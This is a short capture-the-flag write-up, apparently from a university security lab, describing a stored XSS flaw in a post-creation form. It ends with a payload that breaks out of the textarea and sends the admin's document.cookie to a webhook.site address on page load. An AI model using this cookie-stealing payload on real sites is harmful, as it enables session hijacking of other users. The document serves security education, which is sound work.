# Challenge `Go on and censor my posts` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to XSS

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23253`, on the create a post form

- Impact: What results of exploiting this vulnerability
  - Allows the user to run code through XSS, used to steal cookies

## Steps to reproduce

1. Access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23253`
2. The textarea for writing a post is vulnerable to an html injection
3. We can close the textarea and write arbitrary code to be executed
4. To get the flag, a post with the following content was created and sent for admin approval:

```html
</textarea> <body onload="url ='https://webhook.site/a3d25143-6e57-4354-b50c-c0c6fe1a3db9/?cookies=' + encodeURIComponent(document.cookie); fetch(url)";/> <textarea>

```
